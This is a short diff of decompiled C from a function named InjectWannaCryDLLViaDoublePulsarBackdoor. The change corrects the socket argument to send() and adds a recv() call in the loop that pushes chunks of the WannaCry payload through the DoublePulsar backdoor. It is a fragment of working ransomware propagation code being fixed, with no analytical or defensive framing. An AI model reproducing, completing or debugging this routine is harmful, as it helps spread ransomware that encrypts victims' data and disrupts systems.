@@ -50,8 +50,9 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, uns
 		v29 = *(_QWORD *)v16;
 		v30 = *(_DWORD *)&v16[8];
 		qmemcpy(&v31, (char *)hMem + offset, 4096);
-		if ( send(socket, &buf, 4178, 0) == -1 )
+		if ( send(s, &buf, 4178, 0) == -1 )
 			break;
+		recv(s, &recvbuff, 4096, 0);
 		if ( buf[34] != 82 )
 		  break;
 		v13 = __OFSUB__(v22 + 1, iterations);
